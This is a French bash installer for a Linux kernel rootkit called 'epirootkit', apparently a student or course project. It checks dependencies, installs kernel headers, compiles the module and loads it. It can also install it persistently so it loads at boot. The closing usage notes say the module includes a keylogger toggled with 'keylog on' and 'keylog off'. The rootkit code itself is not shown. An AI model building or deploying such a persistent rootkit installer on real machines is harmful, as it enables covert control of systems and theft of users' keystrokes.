#!/bin/bash

# Couleurs pour les messages
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Fonction pour afficher les messages
print_message() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Vérifier les dépendances
check_dependencies() {
    local deps=("make" "gcc" "bc")
    local missing_deps=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing_deps+=("$dep")
        fi
    done

    if [ ${#missing_deps[@]} -ne 0 ]; then
        print_error "Dépendances manquantes : ${missing_deps[*]}"
        print_message "Installation des dépendances..."
        sudo apt-get update
        sudo apt-get install -y "${missing_deps[@]}"
    fi
}

# Vérifier l'espace disque
check_disk_space() {
    local required_space=100 # Mo
    local available_space=$(df -m . | awk 'NR==2 {print $4}')
    
    if [ "$available_space" -lt "$required_space" ]; then
        print_error "Espace disque insuffisant. Requis : ${required_space}Mo, Disponible : ${available_space}Mo"
        exit 1
    fi
}

# Détecter le système d'exploitation
OS="$(uname)"
if [ "$OS" != "Linux" ]; then
    print_error "Ce script doit être exécuté sur un système Linux."
    print_error "Le rootkit est un module kernel qui nécessite un accès direct au noyau Linux."
    exit 1
fi

# Vérifier les dépendances
check_dependencies

# Vérifier l'espace disque
check_disk_space

# Vérifier si les headers du kernel sont installés
if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
    print_error "Les headers du kernel ne sont pas installés."
    print_message "Installation des headers du kernel..."
    sudo apt-get update
    sudo apt-get install -y linux-headers-$(uname -r)
    
    # Vérifier si l'installation a réussi
    if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
        print_error "L'installation des headers du kernel a échoué."
        exit 1
    fi
fi

# Vérifier si le kernel est compatible
KERNEL_VERSION=$(uname -r | cut -d. -f1,2)
if (( $(echo "$KERNEL_VERSION < 4.0" | bc -l) )); then
    print_error "Le kernel doit être en version 4.0.0 ou supérieure."
    print_error "Version actuelle : $KERNEL_VERSION"
    exit 1
fi

# Vérifier si le module est déjà chargé
if lsmod | grep -q "epirootkit"; then
    print_warning "Le module epirootkit est déjà chargé."
    read -p "Voulez-vous le décharger avant de continuer ? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        sudo rmmod epirootkit
    else
        exit 1
    fi
fi

# Compiler le module kernel
print_message "Compilation du module kernel..."
cd rootkit || exit 1
make clean
make

# Vérifier si la compilation a réussi
if [ ! -f "epirootkit.ko" ]; then
    print_error "La compilation du module kernel a échoué. Vérifiez les erreurs ci-dessus."
    exit 1
fi

# Demander si l'utilisateur veut installer le module de manière persistante
read -p "Voulez-vous installer le module de manière persistante ? (y/n) " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    print_message "Installation persistante du module..."
    sudo ./rootkit/install.sh
else
    print_message "Installation manuelle du module..."
    sudo insmod epirootkit.ko
fi

# Vérifier si l'installation a réussi
if ! lsmod | grep -q "epirootkit"; then
    print_error "L'installation du module a échoué."
    exit 1
fi

# Retourner à la racine du projet
cd ..

print_message "░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░  
               ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
               ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
               ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
               ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
               ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
               ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                     
                                                                                                     "
print_message "Installation terminée !"
print_message "Module kernel compilé : rootkit/epirootkit.ko"
print_message ""
print_message "Instructions d'utilisation :"
print_message "1. Si installé de manière persistante, le module se chargera automatiquement au démarrage"
print_message "2. Sinon, charger le module : sudo insmod rootkit/epirootkit.ko"
print_message "3. Vérifier que le module est chargé : lsmod | grep epirootkit"
print_message "4. Pour activer le keylogger : envoyer la commande 'keylog on'"
print_message "5. Pour désactiver le keylogger : envoyer la commande 'keylog off'"
print_message "6. Pour décharger le module : sudo rmmod epirootkit"
print_message ""
print_message "Note : Si le module n'est pas installé de manière persistante, il devra être rechargé après chaque redémarrage du système." 